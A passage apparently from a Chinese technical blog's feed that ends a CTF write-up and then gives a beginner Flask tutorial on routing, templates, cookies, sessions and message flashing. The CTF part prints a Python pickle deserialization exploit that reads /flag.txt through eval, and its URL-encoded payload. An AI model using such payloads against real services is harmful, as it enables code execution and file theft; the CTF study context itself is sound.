member&#x3D;0)</code></pre><p>明显的pickle反序列化利用，POST的<code>become</code>为利用点，随后构造反序列化利用poc：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding: UTF-8 -*-# 题目是在python2环境下，需要用python2跑import pickleimport urllibclass dairy(object):    def __reduce__(self):        return eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,) &#x2F;&#x2F; eval直接读取文件today &#x3D; dairy()# print(pickle.dumps(today))x &#x3D; pickle.dumps(today)print(urllib.quote(x))a &#x3D; pickle.loads(urllib.unquote(x))</code></pre><p>得到payload：</p><pre class="language-python" data-language="python"><code class="language-python">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre><p>传入发包得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Flask</title>
      <link href="/posts/ebf6eea3/"/>
      <url>/posts/ebf6eea3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png" alt loading="lazy"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和<a href="http://docs.jinkan.org/docs/jinja2/">Jinja2</a>模板引擎。两者都是Pocco项目。</p><p><a href="https://dormousehole.readthedocs.io/en/latest/">Flask中文文档</a></p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Python2.7及以上，Python3.4及以上，我这里用的Python2.7</p><p><strong>安装virtualenv</strong></p><p>virtualenv可以创建一个独立的python运行环境，这个环境和系统的python环境是互不干扰的，也就是说你在这个环境中安装的python包不会安装到系统的python环境中，系统python环境中的包会复制到这个环境中（但新版本的virtualenv并不会复制过来，默认只安装<code>setuptools</code>，<code>wheel</code>和<code>pip</code>）</p><p>当然如果不想用系统的包的话可以加一些参数：</p><p><code>–-no-site-packages</code>：表示在建立虚拟环境时不将原版本中的第三方库拷贝过来，这样就能获得一个纯净的Python环境。（可这个参数新版的virtualenv好像用不了，我的就是这样，但网上都这样讲，=.=）</p><p><code>--no-setuptools</code>：不安装setuptools；<code>--no-wheel</code>：不安装whell；<code>--no-pip</code>：不安装pip</p><p>安装virtualenv包：</p><pre class="language-shell" data-language="shell"><code class="language-shell">pip install virtualenv</code></pre><p>创建环境：</p><pre class="language-shell" data-language="shell"><code class="language-shell">mkdir Flask  #创建项目目录cd Flaskvirtualenv -p C:\Python2\python.exe E:\flask\venv  #在这个项目中创建一个独立的python环境，环境命名为venv，-p表示指定python的版本路径.\venv\Scripts\activate  #启动虚拟环境;deactivate可退出此环境</code></pre><p>接下来就要在这个虚拟环境中安装Flask了</p><pre class="language-shell" data-language="shell"><code class="language-shell">E:\flask\venv\Scripts\python.exe -m pip list  #可看到当前虚拟环境中的所有的python包，当然不加路径也可以pip install Flask</code></pre><p>至此虚拟环境就搭建成功了，当然如果你不想用虚拟的python环境用系统自带的也可以</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask #导入Flask模块app &#x3D; Flask(__name__)#使用当前模块作为参数@app.route(&#39;&#x2F;&#39;)def hello_world():    return &#39;Hello World&#39;if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>app.route(rule, options)</code>：该函数为<code>Flask</code>类的一个方法，告诉应用程序哪个URL应该调用相关的函数</p><ul><li><strong>rule</strong>：参数表示与该函数的URL绑定</li><li><strong>endpoint</strong>：被注册的url的名字，一般用来反向生成url的时候使用，默认把视图函数的名字作为endpoint，如:endpoint=”login”</li><li><strong>options</strong>：是要转发给基础Rule对象的参数列表。</li></ul><p>上面的<code>&#39;/&#39;</code>表示URL与hello_world函数绑定，在浏览器中打开web服务器的主页时，将呈现该函数的输出</p><p><code>app.run(host, port, debug, options)</code>：表示本地开发服务器上运行应用程序</p><ul><li><strong>host</strong>：要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</li><li><strong>port</strong>：端口设置，默认值为5000</li><li><strong>debug</strong>：默认为false。 如果设置为true，则提供调试信息</li><li><strong>options</strong>：要转发到底层的Werkzeug服务器。</li></ul><p>浏览器访问<code>http://127.0.0.1:5000/</code>即可看到函数的输出</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)#@app.route(&#39;&#x2F;hello&#39;)  #添加路由def hello_world():    return &#39;Hello World&#39;app.add_url_rule(&#39;&#x2F;hello&#x2F;&#39;,&#39;hello&#39;,view_func&#x3D;hello_world)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>：该方法与route类似</p><ul><li><strong>rule</strong>：一个字符串格式的url规则，如：”/login”</li><li><strong>endpoint</strong>：url规则的名字，用来反向生成url使用，默认是视图函数的名字。</li><li><strong>view_func</strong>：视图函数，当对应的endpoint名字被请求时需要调用的函数。</li><li><strong>options</strong>： 类似route时候的options，methods参数默认是只监听get</li></ul><h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)def hello_world(name):    return &#39;Hello &#123; &#125;&#39;.format(name)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>在浏览器输入<code>http://127.0.0.1:5000/hello/flask</code>则会显示<code>Hello flask</code></p><p>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：</p><ul><li><strong>int</strong>：接受整数，不为整数则404，<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li><li><strong>float</strong>：接受浮点数，不为浮点数则404，<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li><li><strong>path</strong>：接受用作目录分隔符的斜杠，<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li></ul><h2 id="URL构建"><a href="#URL构建" class="headerlink" title="URL构建"></a>URL构建</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, redirect, url_forapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;name&#39;)def hello_admin():   return &#39;hello Admin&#39;@app.route(&#39;&#x2F;guest&#x2F;&lt;guest&gt;&#39;)def hello_guest(guest):   return &#39;Hello &#123; &#125; as Guest&#39;.format(guest)@app.route(&#39;&#x2F;user&#x2F;&lt;name&gt;&#39;)def hello_user(name):   if name &#x3D;&#x3D; &#39;admin&#39;:       return redirect(url_for(&#39;hello_admin&#39;))#redirect函数直接对route的路径进行访问，url_for直接对函数进行访问，一同使用则访问此路径下的函数   else:       return redirect(url_for(&#39;hello_guest&#39;,guest &#x3D; name))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   app.run(debug &#x3D; True)</code></pre><p><code>redirect(location, code=302, Response=None)</code>：该函数用来实现重定向功能</p><ul><li><strong>location</strong>：一个链接地址，可以使用url_for()函数得到，也可以是静态文件地址</li><li><strong>code</strong>：可以取值为301、302、303、305、307，默认302,300、304不可以</li><li><strong>Response</strong>：一个响应类，默认是werkzeug.wrappers.Response</li></ul><p>输入<code>http://127.0.0.1:5000/user/admin</code>则会302重定向到<code>http://127.0.0.1:5000/name</code>显示hello Admin</p><p><code>http://127.0.0.1:5000/user/flask</code>则会302重定向到<code>http://127.0.0.1:5000/guest/flask</code>，显示Hello flask as Guest</p><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>首先创建一个HTML表单，使用POST方法将表单数据发送到URL，命名为login.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>http://localhost:5000/login<span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Enter Name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>nm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, redirect, url_for, requestapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;success&#x2F;&lt;name&gt;&#39;)def success(name):   return &#39;welcome &#123; &#125;&#39;.format(name)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():   if request.method &#x3D;&#x3D; &#39;POST&#39;:       user &#x3D; request.form[&#39;nm&#39;]  #获取参数nm的值       return redirect(url_for(&#39;success&#39;,name &#x3D; user))   else:       user &#x3D; request.args.get(&#39;nm&#39;)       return redirect(url_for(&#39;success&#39;,name &#x3D; user))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   app.run(debug &#x3D; True)</code></pre><p><strong>Request</strong>对象</p><ul><li><strong>Form</strong>：是一个字典对象,包含表单参数及其值的键和值对。</li><li><strong>args</strong>：解析查询字符串的内容，是包含表单参数对及其对应值对的列表的字典对象</li><li><strong>Cookies</strong>：保存Cookie名称和值的字典对象。</li><li><strong>files</strong>：与上传文件有关的数据。</li><li><strong>method</strong>：当前请求方法。</li></ul><p>输入flask回车后先跳转到<code>http://127.0.0.1:5000/login</code>然后自动POST一个nm参数后302重定向到<code>http://127.0.0.1:5000/success/flask</code>输出welcome flask</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def index():   return &#39;&lt;h1&gt;Hello World&lt;&#x2F;h1&gt;&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   app.run(debug &#x3D; True)</code></pre><p>访问网站会得到一个Hello World标题，但这样吧标签插入在python代码中就很麻烦，于是这里就引入了<strong>Jinja2</strong>模板引擎，可以通过<strong>render_template()</strong>函数呈现HTML文件。</p><p>新建一个templates文件夹，在其中建立一个hello.html文件：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello &#123; &#123;  marks &#125;&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, render_templateapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;hello&#x2F;&#39;)@app.route(&#39;&#x2F;hello&#x2F;&lt;score&gt;&#39;)def hello_name(score&#x3D;None):   return render_template(&#39;hello.html&#39;,marks &#x3D; score)#自动寻找目录下的templates文件夹下的html文件if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>访问<code>http://127.0.0.1:5000/hello/flask</code>则会输出<code>Hello flask!</code>标题</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><ul><li><strong><code>&#123;% ... %&#125;</code></strong>：用于语句</li><li><strong><code>&#123;&#123;  ... &#125;&#125;</code></strong>：用于表达式可以打印到模板输出</li><li><strong><code>&#123;# ... #&#125;</code></strong>：用于未包含在模板输出中的注释</li><li><strong><code># ... ##</code></strong>：用于行语句</li></ul><p>另外测试语句效果，修改hello.html为以下内容</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span>&#123;% if marks>50 %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> Your result is pass!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&#123;% else %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Your result is fail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&#123;% endif %&#125;</code></pre><p>脚本中<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>修改为<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/1</code>时输出<code>Your result is fail</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/100</code>时输出<code>Your result is pass!</code></p><p>注意这里必须要对传入的score定义为int型，否则会被当成字符串处理，就会一直输出<code>Your result is pass!</code></p><h2 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h2><p>hello.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span>          <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for('static', filename = 'hello.js') &#125;&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>sayHello()<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>Say Hello<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>hello.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, render_templateapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():   return render_template(&quot;hello.html&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>访问<code>http://127.0.0.1:5000/</code>点击Say Hello弹窗Hello World</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask,redirect,url_for,request,render_template,make_response,escape,session@app.route(&#39;&#x2F;&#39;)def index():   return render_template(&#39;index.html&#39;)@app.route(&#39;&#x2F;setcookie&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def setcookie():   if request.method &#x3D;&#x3D; &#39;POST&#39;:       user &#x3D; request.form[&#39;nm&#39;]       resp &#x3D; make_response(render_template(&#39;readcookie.html&#39;))       resp.set_cookie(&#39;userID&#39;,user)       return resp@app.route(&#39;&#x2F;getcookie&#39;)def getcookie():   name &#x3D; request.cookies.get(&#39;userID&#39;)   a &#x3D; &quot;&lt;h1&gt;welcome &#39;&#123; &#125;&#39;&lt;&#x2F;h1&gt;&quot;.format(name)   return aif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/setcookie<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>Enter userID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>nm<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>Login<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>readcookie.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/getcookie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click here to read cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>首先在访问<code>http://127.0.0.1:5000/</code>传入flask，点击Click here to read cookie即可看到<code>welcome &#39;flask&#39;</code></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>session是存储在服务器上的，会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,sessionimport osapp &#x3D; Flask(__name__)app.secret_key &#x3D; &#39;any random string&#39;#app.secret_key &#x3D; os.urandom(12)@app.route(&#39;&#x2F;&#39;)def index():    if &#39;username&#39; in session:        username &#x3D; session[&#39;username&#39;]        return &#39;Logged in as &#39; + username + &#39;&lt;br&gt;&#39; + &quot;&lt;b&gt;&lt;a href &#x3D; &#39;&#x2F;logout&#39;&gt;click here to log out&lt;&#x2F;a&gt;&lt;&#x2F;b&gt;&quot;    return &quot;You are not logged in &lt;br&gt;&lt;a href &#x3D; &#39;&#x2F;login&#39;&gt;&lt;&#x2F;b&gt;&quot; + &quot;click here to log in&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&quot;@app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        session[&#39;username&#39;] &#x3D; request.form[&#39;username&#39;]        return redirect(url_for(&#39;index&#39;))    return &#39;&#39;&#39;   &lt;form action &#x3D; &quot;&quot; method &#x3D; &quot;post&quot;&gt;      &lt;p&gt;&lt;input type &#x3D; text name &#x3D; username &#x2F;&gt;&lt;&#x2F;p&gt;      &lt;p&gt;&lt;input type &#x3D; submit value &#x3D; Login &#x2F;&gt;&lt;&#x2F;p&gt;   &lt;&#x2F;form&gt;   &#39;&#39;&#39;@app.route(&#39;&#x2F;logout&#39;)def logout():    session.pop(&#39;username&#39;,None)    return redirect(url_for(&#39;index&#39;))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>这里将session_key设置成了any random string</p><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,sessionimport osapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;login.html&#39;)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    if request.method &#x3D;&#x3D; &#39;POST&#39; and request.form[&#39;username&#39;] &#x3D;&#x3D; &#39;admin&#39;:        return redirect(url_for(&#39;success&#39;))    return redirect(url_for(&#39;index&#39;))@app.route(&#39;&#x2F;success&#39;)def success():    return &#39;logged in successfully&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>当用户输入不为admin时则直接302重定向到login界面</p><p>login.html</p><pre class="language-python" data-language="python"><code class="language-python">&lt;html&gt;   &lt;body&gt;      &lt;form action &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.102:5000&#x2F;login&quot; method &#x3D; &quot;post&quot;&gt;         &lt;p&gt;Enter Name:&lt;&#x2F;p&gt;         &lt;p&gt;&lt;input type &#x3D; &quot;text&quot; name &#x3D; &quot;username&quot; &#x2F;&gt;&lt;&#x2F;p&gt;         &lt;p&gt;&lt;input type &#x3D; &quot;submit&quot; value &#x3D; &quot;submit&quot; &#x2F;&gt;&lt;&#x2F;p&gt;      &lt;&#x2F;form&gt;   &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>报错：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,session,abortimport osapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;login.html&#39;)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        if request.form[&#39;username&#39;] &#x3D;&#x3D; &#39;admin&#39;:            return redirect(url_for(&#39;success&#39;))        else:            abort(401)    else:        return redirect(url_for(&#39;index&#39;))@app.route(&#39;&#x2F;success&#39;)def success():    return &#39;logged in successfully&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>Flask.abort(code)</code>：带有错误代码的abort函数</p><ul><li><strong>400</strong> - 用于错误请求</li><li><strong>401</strong> - 用于未身份验证的</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - 未不到</li><li><strong>406</strong> - 表示不接受</li><li><strong>415</strong> - 用于不支持的媒体类型</li><li><strong>429</strong> - 请求过多</li></ul><p>若登录不是admin则报401：<code>Unauthorized</code>错误</p><h2 id="消息闪现"><a href="#消息闪现" class="headerlink" title="消息闪现"></a>消息闪现</h2><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,session,abort,flashimport osapp &#x3D; Flask(__name__)app.secret_key &#x3D; os.urandom(12)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;index.html&#39;)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    error &#x3D; None    if request.method &#x3D;&#x3D; &#39;POST&#39;:        if request.form[&#39;username&#39;] !&#x3D; &#39;admin&#39; or request.form[&#39;password&#39;] !&#x3D; &#39;admin&#39;:            error &#x3D; &#39;Invalid username or password. Please try again!&#39;        else:            flash(&#39;You were successfully logged in&#39;)            return redirect(url_for(&#39;index&#39;))    return render_template(&#39;login.html&#39;, error &#x3D; error)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>flash(message, category)</code>：将消息传递给下一个请求，该请求通常是一个模板。</p><ul><li><strong>message</strong>：参数是要闪现的实际消息。</li><li><strong>category</strong>：参数是可选的。它可以是“error”，“info”或“warning”。</li></ul><p><code>get_flashed_messages(with_categories, category_filter)</code>：从会话中删除消息</p><p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。第一个默认为False</p><p>典型的消息闪现模板：</p><pre class="language-html" data-language="html"><code class="language-html">&#123;% with messages = get_flashed_messages() %&#125;   &#123;% if messages %&#125;      &#123;% for message in messages %&#125;         &#123;&#123;  message &#125;&#125;      &#123;% endfor %&#125;   &#123;% endif %&#125;&#123;% endwith %&#125;</code></pre><p>下面给出html代码：</p><p>index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>&#123;% with messages = get_flashed_messages() %&#125;    &#123;% if messages %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          &#123;% for message in messages %&#125;          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>&#123; &#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          &#123;% endfor %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    &#123;% endif %&#125; &#123;% endwith %&#125; <span 